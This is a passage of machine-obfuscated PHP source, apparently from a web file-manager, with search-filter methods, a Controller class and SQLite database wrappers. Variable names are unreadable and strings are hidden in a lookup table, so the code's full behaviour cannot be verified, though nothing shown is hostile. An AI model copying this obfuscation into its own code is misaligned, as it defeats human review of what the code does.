(stripos($˜ŸŠ‡ìè, $ˆ…´ı²) !== !1 || stripos($øÇÛïîÔ, $ˆ…´ı²) !== !1) { $Ä‘ÄÊÉü[] = $ïâ©Ì[$ĞÊåšÁ¾[487]]; } } if (!$Ä‘ÄÊÉü) { return; } $Ùé©¨µÏ = array($ĞÊåšÁ¾[515] => array($ĞÊåšÁ¾[7], $Ä‘ÄÊÉü), $ĞÊåšÁ¾[1582] => 0, $ĞÊåšÁ¾[33] => $ĞÊåšÁ¾[1480] . $‰¬ £‰); $³»Ö€·Â = Model($ĞÊåšÁ¾[517])->field($ĞÊåšÁ¾[87])->where($Ùé©¨µÏ)->select(); $³»Ö€·Â = array_to_keyvalue($³»Ö€·Â, $ĞÊåšÁ¾[12], $ĞÊåšÁ¾[87]); $…”°¼® = array_unique($³»Ö€·Â); $this->_listSearchMerge($Ì³úœÊ, $Ùš½¼Ï§, $Ë¬¬ˆ››, $…”°¼®); } private function _listSearchMerge(&$ˆœá—®”, $¶’¦–Ê, $¾ÛÉ¹ë, $ÈÈÎ—»Ş) { $ëÕË‰ =& $_SERVER[¹Éµ„ºå]; if (!$ÈÈÎ—»Ş) { return; } $¡ç¤Æ¸ = array_to_keyvalue($ˆœá—®”[$ëÕË‰[446]], $ëÕË‰[12], $ëÕË‰[191]); $§şùæûÕ = array_diff($ÈÈÎ—»Ş, $¡ç¤Æ¸); if (!$§şùæûÕ) { return; } $™¤æ‘çÔ = array($ëÕË‰[191] => array($ëÕË‰[7], $§şùæûÕ)); $¨º©’à´ = $this->field($¾ÛÉ¹ë)->where($™¤æ‘çÔ)->select(); if (!$¨º©’à´) { return; } $‰º¡Áší = array(); foreach ($¨º©’à´ as $Ë½÷º) { if ($this->_listSearchFilter($Ë½÷º, $¶’¦–Ê)) { $‰º¡Áší[] = $Ë½÷º; } } $ˆœá—®”[$ëÕË‰[446]] = array_merge($‰º¡Áší, $ˆœá—®”[$ëÕË‰[446]]); $ˆœá—®”[$ëÕË‰[443]][$ëÕË‰[444]] += count($‰º¡Áší); } private function _listSearchFilter($ß‡¤îÍ, $¿¹ÆÕ©) { $ûÌÕ˜  =& $_SERVER[¹Éµ„ºå]; $­çËö°… = $ß‡¤îÍ[$ûÌÕ˜ [500]] == $ûÌÕ˜ [91]; if (!strstr($ß‡¤îÍ[$ûÌÕ˜ [604]], $ûÌÕ˜ [50] . $¿¹ÆÕ©[$ûÌÕ˜ [190]] . $ûÌÕ˜ [50])) { return !1; } if (isset($¿¹ÆÕ©[$ûÌÕ˜ [501]]) && $¿¹ÆÕ©[$ûÌÕ˜ [501]] != $ûÌÕ˜ [935]) { if ($¿¹ÆÕ©[$ûÌÕ˜ [501]] == $ûÌÕ˜ [78] && !$­çËö°…) { return !1; } if ($¿¹ÆÕ©[$ûÌÕ˜ [501]] != $ûÌÕ˜ [78] && $­çËö°…) { return !1; } if (!strstr($ß‡¤îÍ[$ûÌÕ˜ [166]], $ûÌÕ˜ [50] . $¿¹ÆÕ©[$ûÌÕ˜ [501]] . $ûÌÕ˜ [50])) { return !1; } } if (isset($¿¹ÆÕ©[$ûÌÕ˜ [2441]]) && $¿¹ÆÕ©[$ûÌÕ˜ [2441]] < $ß‡¤îÍ[$ûÌÕ˜ [79]]) { return !1; } if (isset($¿¹ÆÕ©[$ûÌÕ˜ [2442]]) && $¿¹ÆÕ©[$ûÌÕ˜ [2442]] > $ß‡¤îÍ[$ûÌÕ˜ [79]]) { return !1; } if (isset($¿¹ÆÕ©[$ûÌÕ˜ [684]]) && $¿¹ÆÕ©[$ûÌÕ˜ [684]] != $ß‡¤îÍ[$ûÌÕ˜ [543]]) { return !1; } return !0; } public function listSearchChildren($úõùö·á, $‹‘ß¨® = 5000) { $ø‰ŒÙ¸ =& $_SERVER[¹Éµ„ºå]; $üŠîĞ›Ç = array(); $ÎµÍ¹Çà = $this->sourceInfo($úõùö·á); $ü£Ç¿÷ = array($ø‰ŒÙ¸[604] => array($ø‰ŒÙ¸[473], $ÎµÍ¹Çà[$ø‰ŒÙ¸[604]] . $ÎµÍ¹Çà[$ø‰ŒÙ¸[191]] . $ø‰ŒÙ¸[636])); $·Ü©úá = $this->field($ø‰ŒÙ¸[79])->where($ü£Ç¿÷)->limit($‹‘ß¨® + 1)->select(); $åÛ×ˆŠ‚ = is_array($·Ü©úá) ? count($·Ü©úá) : 0; if ($åÛ×ˆŠ‚ > $‹‘ß¨®) { return $this->_listSearchChildrenNear($úõùö·á, $‹‘ß¨®); } $õİõÔ× = $this->field($ø‰ŒÙ¸[191])->where($ü£Ç¿÷)->select(); $üŠîĞ›Ç = array_to_keyvalue($õİõÔ×, $ø‰ŒÙ¸[12], $ø‰ŒÙ¸[191]); return $üŠîĞ›Ç; } private function _listSearchChildrenNear($¸»ÇÄŠœ, $ºó½ø¼û) { $†îò×¢¹ =& $_SERVER[¹Éµ„ºå]; $«³‰ğ¼† = array(); $Ã×Â¯ä = array($†îò×¢¹[190] => $¸»ÇÄŠœ); $æåóí¼© = $this->field($†îò×¢¹[2443])->where($Ã×Â¯ä)->select(); $ç¿¹Üì˜ = array_to_keyvalue(array_filter_by_field($æåóí¼©, $†îò×¢¹[500], $†îò×¢¹[91]), $†îò×¢¹[12], $†îò×¢¹[191]); $«³‰ğ¼† = array_merge($«³‰ğ¼†, array_to_keyvalue($æåóí¼©, $†îò×¢¹[12], $†îò×¢¹[191])); if (!$ç¿¹Üì˜) { return $«³‰ğ¼†; } $Ã×Â¯ä = array($†îò×¢¹[190] => array($†îò×¢¹[7], $ç¿¹Üì˜)); $æåóí¼© = $this->field($†îò×¢¹[2443])->where($Ã×Â¯ä)->limit($ºó½ø¼û)->select(); $«³‰ğ¼† = array_merge($«³‰ğ¼†, array_to_keyvalue($æåóí¼©, $†îò×¢¹[12], $†îò×¢¹[191])); $«³‰ğ¼† = array_slice($«³‰ğ¼†, 0, intval($ºó½ø¼û)); return $«³‰ğ¼†; } private function _listSearchBindPinyin($òÔÑƒÈ, &$ê·íÔ«ë, &$ÅÔıı¡) { $°êá×í¶ =& $_SERVER[¹Éµ„ºå]; if (!isset($òÔÑƒÈ[$°êá×í¶[2269]]) || !$òÔÑƒÈ[$°êá×í¶[2269]]) { return; } if (!Input::check($òÔÑƒÈ[$°êá×í¶[2269]], $°êá×í¶[393]) || strlen($òÔÑƒÈ[$°êá×í¶[2269]]) < 2) { return; } $ËşÊ¨É = "\114\105\x46\x54\40\x4a\117\111\116\40{$this->tablePrefix}\x69\x6f\137\163\x6f\x75\x72\x63\x65\x5f\x6d\145\x74\141\40\x6d\145\x74\141\40\x6f\x6e\x20\x73\157\x75\162\143\145\56\163\x6f\x75\x72\143\x65\111\104\40\x3d\x20\x6d\x65\164\x61\56\163\157\165\x72\143\145\111\104"; $çÎöĞù˜ = array(); $ÅÔıı¡ = str_replace(array($°êá×í¶[285], $°êá×í¶[53], $°êá×í¶[2444]), $°êá×í¶[12], $ÅÔıı¡); $ÅÔıı¡ = $°êá×í¶[525] . str_replace($°êá×í¶[50], $°êá×í¶[526], $ÅÔıı¡); $ŸĞöÂÃ© = $ê·íÔ«ë[$°êá×í¶[32]]; unset($ê·íÔ«ë[$°êá×í¶[32]]); foreach ($ê·íÔ«ë as $òŠ†Ø’ß => $ëşÏ’£õ) { $çÎöĞù˜[$°êá×í¶[525] . $òŠ†Ø’ß] = $ëşÏ’£õ; } foreach ($ŸĞöÂÃ© as $†ÄÄ¥©›) { $çÎöĞù˜[] = array($°êá×í¶[530] => $†ÄÄ¥©›, $°êá×í¶[1157] => $°êá×í¶[2273], array($°êá×í¶[2445] => $†ÄÄ¥©›, $°êá×í¶[2446] => array($°êá×í¶[7], array($°êá×í¶[552], $°êá×í¶[551])))); } $this->join($ËşÊ¨É); $ê·íÔ«ë = $çÎöĞù˜; } private function _parseSearchWhere($™‰»»¼¼) { $Ñš¹›ÍÈ =& $_SERVER[¹Éµ„ºå]; $ÌĞÜöÖ¨ = array(); if (isset($™‰»»¼¼[$Ñš¹›ÍÈ[852]]) && $™‰»»¼¼[$Ñš¹›ÍÈ[852]]) { $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[88]] = array($Ñš¹›ÍÈ[2447], $™‰»»¼¼[$Ñš¹›ÍÈ[852]]); } if (isset($™‰»»¼¼[$Ñš¹›ÍÈ[853]]) && $™‰»»¼¼[$Ñš¹›ÍÈ[853]]) { $Ü¢§¯° = array($Ñš¹›ÍÈ[2448], $™‰»»¼¼[$Ñš¹›ÍÈ[853]]); if ($ÌĞÜöÖ¨[$Ñš¹›ÍÈ[88]]) { $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[88]] = array($ÌĞÜöÖ¨[$Ñš¹›ÍÈ[88]], $Ü¢§¯°, $Ñš¹›ÍÈ[2449]); } else { $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[88]] = $Ü¢§¯°; } } if (isset($™‰»»¼¼[$Ñš¹›ÍÈ[2441]]) && $™‰»»¼¼[$Ñš¹›ÍÈ[2441]] > 0) { $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[79]] = array($Ñš¹›ÍÈ[2447], $™‰»»¼¼[$Ñš¹›ÍÈ[2441]]); } if (isset($™‰»»¼¼[$Ñš¹›ÍÈ[2442]]) && $™‰»»¼¼[$Ñš¹›ÍÈ[2442]]) { $Ü¢§¯° = array($Ñš¹›ÍÈ[2448], $™‰»»¼¼[$Ñš¹›ÍÈ[2442]]); if ($ÌĞÜöÖ¨[$Ñš¹›ÍÈ[79]]) { $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[79]] = array($ÌĞÜöÖ¨[$Ñš¹›ÍÈ[79]], $Ü¢§¯°, $Ñš¹›ÍÈ[2449]); } else { $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[79]] = $Ü¢§¯°; } } if (isset($™‰»»¼¼[$Ñš¹›ÍÈ[684]]) && $™‰»»¼¼[$Ñš¹›ÍÈ[684]]) { $ÌĞÜöÖ¨[] = array($Ñš¹›ÍÈ[543] => $™‰»»¼¼[$Ñš¹›ÍÈ[684]], $Ñš¹›ÍÈ[541] => $™‰»»¼¼[$Ñš¹›ÍÈ[684]], $Ñš¹›ÍÈ[1157] => $Ñš¹›ÍÈ[2273]); } if (isset($™‰»»¼¼[$Ñš¹›ÍÈ[501]]) && $™‰»»¼¼[$Ñš¹›ÍÈ[501]]) { $Ëü–ˆ²‹ = $™‰»»¼¼[$Ñš¹›ÍÈ[501]]; if ($Ëü–ˆ²‹ == $Ñš¹›ÍÈ[78]) { $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[500]] = 1; } else { if ($Ëü–ˆ²‹ == $Ñš¹›ÍÈ[2450]) { $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[500]] = 0; } else { if ($Ëü–ˆ²‹) { $Ëü–ˆ²‹ = is_array($Ëü–ˆ²‹) ? $Ëü–ˆ²‹ : explode($Ñš¹›ÍÈ[50], $Ëü–ˆ²‹); $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[501]] = array($Ñš¹›ÍÈ[507], $Ëü–ˆ²‹); $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[500]] = 0; } } } } $this->_parseSearchParent($™‰»»¼¼, $ÌĞÜöÖ¨); if (isset($™‰»»¼¼[$Ñš¹›ÍÈ[2269]]) && trim($™‰»»¼¼[$Ñš¹›ÍÈ[2269]])) { $ú¿Ã­†… = trim($™‰»»¼¼[$Ñš¹›ÍÈ[2269]]); $Çäø¨Áô = explode($Ñš¹›ÍÈ[53], $ú¿Ã­†…); if (strlen($ú¿Ã­†…) > 2 && (substr($ú¿Ã­†…, 0, 1) == $Ñš¹›ÍÈ[118] && substr($ú¿Ã­†…, -1) == $Ñš¹›ÍÈ[118]) || substr($ú¿Ã­†…, 0, 1) == $Ñš¹›ÍÈ[58] && substr($ú¿Ã­†…, -1) == $Ñš¹›ÍÈ[58]) { $ú¿Ã­†… = substr($ú¿Ã­†…, 1, -1); $Çäø¨Áô = array($ú¿Ã­†…); } $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[32]] = array(array($Ñš¹›ÍÈ[635], $Ñš¹›ÍÈ[2271] . $ú¿Ã­†… . $Ñš¹›ÍÈ[2271])); if (count($Çäø¨Áô) > 1) { $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[32]] = array(); foreach ($Çäø¨Áô as $±ÖÇù›) { if (!trim($±ÖÇù›)) { continue; } $ÌĞÜöÖ¨[$Ñš¹›ÍÈ[32]][] = array($Ñš¹›ÍÈ[635], $Ñš¹›ÍÈ[2271] . trim($±ÖÇù›) . $Ñš¹›ÍÈ[2271]); } } } return $ÌĞÜöÖ¨; } private function _parseSearchParent($Ü˜•î‚ª, &$Î³·ù±) { $²‡‹‰§ =& $_SERVER[¹Éµ„ºå]; if (!isset($Ü˜•î‚ª[$²‡‹‰§[190]]) || !$Ü˜•î‚ª[$²‡‹‰§[190]]) { return; } $‡òÍ‡Ò = $this->pathInfo($Ü˜•î‚ª[$²‡‹‰§[190]]); $˜—½Ê¿ö = $‡òÍ‡Ò[$²‡‹‰§[190]] . $²‡‹‰§[12] === $²‡‹‰§[228]; $œãš§÷ã = $‡òÍ‡Ò[$²‡‹‰§[188]] == $²‡‹‰§[598]; if ($‡òÍ‡Ò[$²‡‹‰§[614]] == $²‡‹‰§[615]) { $¨ñ¥×å¸ = $this->sourceInfo($Ü˜•î‚ª[$²‡‹‰§[190]]); $‡òÍ‡Ò[$²‡‹‰§[604]] = $¨ñ¥×å¸[$²‡‹‰§[604]]; } $Î³·ù±[$²‡‹‰§[674]] = array($²‡‹‰§[635], $‡òÍ‡Ò[$²‡‹‰§[604]] . $Ü˜•î‚ª[$²‡‹‰§[190]] . $²‡‹‰§[636]); $ß©ŠË±ş = isset($Ü˜•î‚ª[$²‡‹‰§[2131]]) && in_array($²‡‹‰§[598], $Ü˜•î‚ª[$²‡‹‰§[2131]]); if (!$ß©ŠË±ş || !$œãš§÷ã || !$˜—½Ê¿ö || !$‡òÍ‡Ò[$²‡‹‰§[502]]) { return; } if (!AuthModel::authCheckRoot($‡òÍ‡Ò[$²‡‹‰§[502]][$²‡‹‰§[503]])) { return; } $‡«Î®¦à = $‡òÍ‡Ò[$²‡‹‰§[589]] . $²‡‹‰§[12]; if ($‡«Î®¦à == $²‡‹‰§[91]) { unset($Î³·ù±[$²‡‹‰§[674]]); $Î³·ù±[$²‡‹‰§[188]] = self::TYPE_GROUP; return; } $ï—®»Ø£ = Model($²‡‹‰§[605])->groupChildrenAll($‡«Î®¦à); $âõÇÜñú = count($ï—®»Ø£); if ($âõÇÜñú <= 1) { return; } $¸øéÏ¡ = array($²‡‹‰§[190] => 0, $²‡‹‰§[188] => self::TYPE_GROUP, $²‡‹‰§[589] => array($²‡‹‰§[7], $ï—®»Ø£)); $Ùò¥¦ı÷ = $this->field($²‡‹‰§[2451])->where($¸øéÏ¡)->limit($âõÇÜñú)->select(); $Î³·ù±[$²‡‹‰§[674]] = array(); foreach ($Ùò¥¦ı÷ as $ÅÃĞ™œƒ) { $Î³·ù±[$²‡‹‰§[674]][] = array($²‡‹‰§[635], $²‡‹‰§[613] . $ÅÃĞ™œƒ[$²‡‹‰§[191]] . $²‡‹‰§[636]); } $Î³·ù±[$²‡‹‰§[674]][] = $²‡‹‰§[2273]; } } goto f®……à÷œì; AË©É‚ì÷: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $µ—Ùˆó =& $_SERVER[¹Éµ„ºå]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$µ—Ùˆó[6]] =& $config; $this->values[$µ—Ùˆó[7]] =& $in; $this->tpl = TEMPLATE . MOD . $µ—Ùˆó[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($™‹±ğø) { if (1 === func_num_args()) { $this->{$™‹±ğø} = new $™‹±ğø(); } else { $òÀ¾–œÔ = new ReflectionClass($™‹±ğø); $¡²ÌÃ›ƒ = func_get_args(); array_shift($¡²ÌÃ›ƒ); $this->{$™‹±ğø} = $òÀ¾–œÔ->newInstanceArgs($¡²ÌÃ›ƒ); } return $this->{$™‹±ğø}; } public function routeBind($î‡ë¯Õ, $ÉÇ‚İ¼, $‘Ÿ•ïÑ = 3) { $á¢Àü‚ =& $_SERVER[¹Éµ„ºå]; $Ç§úê› = $this->in[$á¢Àü‚[9]]; $î‡ë¯Õ = str_replace($á¢Àü‚[10], $á¢Àü‚[11], trim(trim($î‡ë¯Õ, $á¢Àü‚[8]), $á¢Àü‚[12])); if (!$î‡ë¯Õ || count($Ç§úê›) <= $‘Ÿ•ïÑ) { return !1; } $íÑÆ“ª = !0; $‡˜×™¬ø = explode($á¢Àü‚[8], $î‡ë¯Õ); for ($ê¥æß¾‘ = 0; $ê¥æß¾‘ < count($‡˜×™¬ø); $ê¥æß¾‘++) { if ($‡˜×™¬ø[$ê¥æß¾‘] != $Ç§úê›[$‘Ÿ•ïÑ + $ê¥æß¾‘]) { $íÑÆ“ª = !1; break; } } if (!$íÑÆ“ª) { return; } call_user_func_array(array($this, $ÉÇ‚İ¼), array()); } public function routeArgs($ŒÆ€‘Ì = 3) { $‡µ®Êåá = $this->in[$_SERVER[¹Éµ„ºå][9]]; if (count($‡µ®Êåá) <= $ŒÆ€‘Ì) { return array(); } $ÔŠÅÀ¨„ = array(); for ($·¥ã°Ğ¨ = $ŒÆ€‘Ì; $·¥ã°Ğ¨ < count($‡µ®Êåá); $·¥ã°Ğ¨ += 2) { $ÔŠÅÀ¨„[$‡µ®Êåá[$·¥ã°Ğ¨]] = $‡µ®Êåá[$·¥ã°Ğ¨ + 1]; $this->in[$‡µ®Êåá[$·¥ã°Ğ¨]] = $‡µ®Êåá[$·¥ã°Ğ¨ + 1]; } return $ÔŠÅÀ¨„; } protected function assign($¦ü…ûİğ, $„Î¾ì¬ˆ) { $this->values[$¦ü…ûİğ] = $„Î¾ì¬ˆ; } protected function display($òÆÁÛ “) { ob_end_clean(); extract($this->values); require $this->tpl . $òÆÁÛ “; } } class DbSqliteBase extends Db { public function __construct($…şœŠ™ = '') { $ˆØËĞÊ =& $_SERVER[¹Éµ„ºå]; if (!extension_loaded($ˆØËĞÊ[13])) { think_exception(think_lang($ˆØËĞÊ[14]) . $ˆØËĞÊ[15]); } if (!empty($…şœŠ™)) { if (!isset($…şœŠ™[$ˆØËĞÊ[16]])) { $…şœŠ™[$ˆØËĞÊ[16]] = 438; } $this->config = $…şœŠ™; if (empty($this->config[$ˆØËĞÊ[17]])) { $this->config[$ˆØËĞÊ[17]] = array(); } } } public function connect($ã°‹ÄœÏ = '', $ĞÉ ¼È÷ = 0) { $ÓÉíºâæ =& $_SERVER[¹Éµ„ºå]; if (!isset($this->linkID[$ĞÉ ¼È÷])) { if (empty($ã°‹ÄœÏ)) { $ã°‹ÄœÏ = $this->config; } $®¶úéÈ = !empty($ã°‹ÄœÏ[$ÓÉíºâæ[17]][$ÓÉíºâæ[18]]) ? $ã°‹ÄœÏ[$ÓÉíºâæ[17]][$ÓÉíºâæ[18]] : $this->pconnect; $¥øûÚÂö = $®¶úéÈ ? $ÓÉíºâæ[19] : $ÓÉíºâæ[20]; $this->linkID[$ĞÉ ¼È÷] = $¥øûÚÂö($ã°‹ÄœÏ[$ÓÉíºâæ[21]], $ã°‹ÄœÏ[$ÓÉíºâæ[16]]); if (!$this->linkID[$ĞÉ ¼È÷]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ĞÉ ¼È÷], 30000); if (1 != think_config($ÓÉíºâæ[22])) { unset($this->config); } } return $this->linkID[$ĞÉ ¼È÷]; } public function free() { $this->queryID = null; } public function query($Ò•Ú’¿Ô) { $¤ÖÛÓ¸Ó =& $_SERVER[¹Éµ„ºå]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ò•Ú’¿Ô; if ($this->queryID) { $this->free(); } think_action_status($¤ÖÛÓ¸Ó[23], 1); think_status($¤ÖÛÓ¸Ó[24]); $this->queryID = sqlite_query($this->_linkID, $Ò•Ú’¿Ô); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ºïÏÄ™‰ = $this->getAll(); return $ºïÏÄ™‰; } } public function execute($íÀÏ×œ) { $Çóä¿øï =& $_SERVER[¹Éµ„ºå]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $íÀÏ×œ; if ($this->queryID) { $this->free(); } think_action_status($Çóä¿øï[25], 1); think_status($Çóä¿øï[24]); $è‡Ş¡™ú = sqlite_exec($this->_linkID, $íÀÏ×œ); $this->debug(); if (!1 === $è‡Ş¡™ú) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¹Éµ„ºå][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÈöÕ—Æ¼ = sqlite_query($this->_linkID, $_SERVER[¹Éµ„ºå][27]); if (!$ÈöÕ—Æ¼) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $èãòö§ = sqlite_query($this->_linkID, $_SERVER[¹Éµ„ºå][28]); if (!$èãòö§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ê““¥«Û = array(); if ($this->numRows > 0) { for ($õôŒİ¿Š = 0; $õôŒİ¿Š < $this->numRows; $õôŒİ¿Š++) { $ê““¥«Û[$õôŒİ¿Š] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ê““¥«Û; } public function getFields($€¡…ˆÔÃ) { $˜•“ƒÍ =& $_SERVER[¹Éµ„ºå]; $éİ¼‚Éè = $this->query($˜•“ƒÍ[29] . $€¡…ˆÔÃ . $˜•“ƒÍ[30]); $Óê¡¿ × = array(); if ($éİ¼‚Éè) { foreach ($éİ¼‚Éè as $ú²ˆÙ× => $µöôÉº ) { $Óê¡¿ ×[$µöôÉº [$˜•“ƒÍ[31]]] = array($˜•“ƒÍ[32] => $µöôÉº [$˜•“ƒÍ[31]], $˜•“ƒÍ[33] => $µöôÉº [$˜•“ƒÍ[34]], $˜•“ƒÍ[35] => (bool) ($µöôÉº [$˜•“ƒÍ[36]] === $˜•“ƒÍ[12]), $˜•“ƒÍ[37] => $µöôÉº [$˜•“ƒÍ[38]], $˜•“ƒÍ[39] => strtolower($µöôÉº [$˜•“ƒÍ[40]]) == $˜•“ƒÍ[41], $˜•“ƒÍ[42] => strtolower($µöôÉº [$˜•“ƒÍ[43]]) == $˜•“ƒÍ[44]); } } return $Óê¡¿ ×; } public function getTables($ˆšœ‰†ä = '') { $šÜà³³¸ =& $_SERVER[¹Éµ„ºå]; $­©’­ı© = $this->query($šÜà³³¸[45] . $šÜà³³¸[46] . $šÜà³³¸[47]); $Ü÷Ú¨±Ï = array(); foreach ($­©’­ı© as $ÉÓØãõú => $Òû¬â»×) { $Ü÷Ú¨±Ï[$ÉÓØãõú] = current($Òû¬â»×); } return $Ü÷Ú¨±Ï; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Öıµ€µê =& $_SERVER[¹Éµ„ºå]; $¦ªıÀ­’ = sqlite_last_error($this->_linkID); $this->error = $¦ªıÀ­’ . $Öıµ€µê[4] . sqlite_error_string($¦ªıÀ­’); if ($Öıµ€µê[12] != $this->queryStr) { $this->error .= LNG($Öıµ€µê[48]) . $this->queryStr; } think_trace($this->error, $Öıµ€µê[12], $Öıµ€µê[49]); return $this->error; } public function escapeString($½ä×á‰Ã) { return sqlite_escape_string($½ä×á‰Ã); } public function parseLimit($ú’à¿º„) { $Íûßœû =& $_SERVER[¹Éµ„ºå]; $¡§ÎÏ‡ï = $Íûßœû[12]; if (!empty($ú’à¿º„)) { $ú’à¿º„ = explode($Íûßœû[50], $ú’à¿º„); if (count($ú’à¿º„) > 1) { $¡§ÎÏ‡ï .= $Íûßœû[51] . $ú’à¿º„[1] . $Íûßœû[52] . $ú’à¿º„[0] . $Íûßœû[53]; } else { $¡§ÎÏ‡ï .= $Íûßœû[51] . $ú’à¿º„[0] . $Íûßœû[53]; } } return $¡§ÎÏ‡ï; } } class DbSqlite3Base extends Db { public function __construct($¬éİıÏİ = '') { $¡‹­”¿² =& $_SERVER[¹Éµ„ºå]; if (!class_exists($¡‹­”¿²[54])) { think_exception(think_lang($¡‹­”¿²[14]) . $¡‹­”¿²[55]); } if (!empty($¬éİıÏİ)) { if (!isset($¬éİıÏİ[$¡‹­”¿²[16]])) { $¬éİıÏİ[$¡‹­”¿²[16]] = 438; } $this->config = $¬éİıÏİ; if (empty($this->config[$¡‹­”¿²[17]])) { $this->config[$¡‹­”¿²[17]] = array(); } } } public function connect($Çı³èŠ = '', $î™Â¿÷â = 0) { $£ÎÎÒ÷Î =& $_SERVER[¹Éµ„ºå]; if (!isset($this->linkID[$î™Â¿÷â])) { if (empty($Çı³èŠ)) { $Çı³èŠ = $this->config; } $this->linkID[$î™Â¿÷â] = new SQLite3($Çı³èŠ[$£ÎÎÒ÷Î[21]]); if (!$this->linkID[$î™Â¿÷â]) { think_exception($this->linkID[$î™Â¿÷â]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$î™Â¿÷â]->busyTimeout(30000); if (1 != think_config($£ÎÎÒ÷Î[22])) { unset($this->config); } } return $this->linkID[$î™Â¿÷â]; } public function free() { $this->queryID = null; } public function query($òéú„ç¸) { $Š´™Š¥ =& $_SERVER[¹Éµ„ºå]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $òéú„ç¸; if ($this->queryID) { $this->free(); } think_action_status($Š´™Š¥[23], 1); think_status($Š´™Š¥[24]); $this->queryID = $this->_linkID->query($òéú„ç¸); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ë¨èÛ¿ = $this->getAll(); $this->numRows = count($Ë¨èÛ¿); return $Ë¨èÛ¿; } } public function execute($À‹—ı£ ) { $Úàï¿Šâ =& $_SERVER[¹Éµ„ºå]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $À‹—ı£ ; if ($this->queryID) { $this->free(); } think_action_status($Úàï¿Šâ[25], 1); think_status($Úàï¿Šâ[24]); $«¸Ô™º = $this->_linkID->exec($À‹—ı£ ); $this->debug(); if (!1 === $«¸Ô™º) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¹Éµ„ºå][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $³ëó¤› = $this->_linkID->query($_SERVER[¹Éµ„ºå][27]); if (!$³ëó¤›) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ú”€şÑ¢ = $this->_linkID->query($_SERVER[¹Éµ„ºå][28]); if (!$Ú”€şÑ¢) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $„ÂÙ¾¢ú = array(); while ($”à‘¦Ã™ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $„ÂÙ¾¢ú[] = $”à‘¦Ã™; } $this->queryID->reset(); return $„ÂÙ¾¢ú; } public function getFields($«Š¸ïÊ™) { $ıüñËù­ =& $_SERVER[¹Éµ„ºå]; $¸µø¼ÙÚ = $this->query($ıüñËù­[29] . $«Š¸ïÊ™ . $ıüñËù­[30]); $û†¶Ù¹Í = array(); if ($¸µø¼ÙÚ) { foreach ($¸µø¼ÙÚ as $ÊˆÈéì => $‚éñë€‘) { $û†¶Ù¹Í[$‚éñë€‘[$ıüñËù­[32]]] = array($ıüñËù­[32] => $‚éñë€‘[$ıüñËù­[32]], $ıüñËù­[33] => $‚éñë€‘[$ıüñËù­[33]], $ıüñËù­[35] => (bool) ($‚éñë€‘[$ıüñËù­[35]] === $ıüñËù­[12]), $ıüñËù­[37] => $‚éñë€‘[$ıüñËù­[56]], $ıüñËù­[39] => (bool) $‚éñë€‘[$ıüñËù­[57]], $ıüñËù­[42] => (bool) $‚éñë€‘[$ıüñËù­[57]]); } } return $û†¶Ù¹Í; } public function getTables($…¯ÔÏ = '') { $ Ú´±íı =& $_SERVER[¹Éµ„ºå]; $„ü“ûì™ = $this->query($ Ú´±íı[45] . $ Ú´±íı[46] . $ Ú´±íı[47]); $·€¬İ³® = array(); foreach ($„ü“ûì™ as $¶¤—»ªĞ => $ö„ŞÊÛÈ) { $·€¬İ³®[$¶¤—»ªĞ] = current($ö„ŞÊÛÈ); } return $·€¬İ³®; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $»åÜÈì… =& $_SERVER[¹Éµ„ºå]; $this->error = $this->_linkID->lastErrorMsg(); if ($»åÜÈì…[12] != $this->queryStr) { $this->error .= LNG($»åÜÈì…[48]) . $this->queryStr; } think_trace($this->error, $»åÜÈì…[12], $»åÜÈì…[49]); return $this->error; } public function escapeString($Å˜ç÷°Ä) { $÷—ï şÂ =& $_SERVER[¹Éµ„ºå]; if ($this->_linkID) { return $this->_linkID->escapeString($Å˜ç÷°Ä); } return str_ireplace($÷—ï şÂ[58], $÷—ï şÂ[59], $Å˜ç÷°Ä); } public function parseLimit($êâøÀ”) { $ãäÆï© =& $_SERVER[¹Éµ„ºå]; $à°šú‘ = $ãäÆï©[12]; if 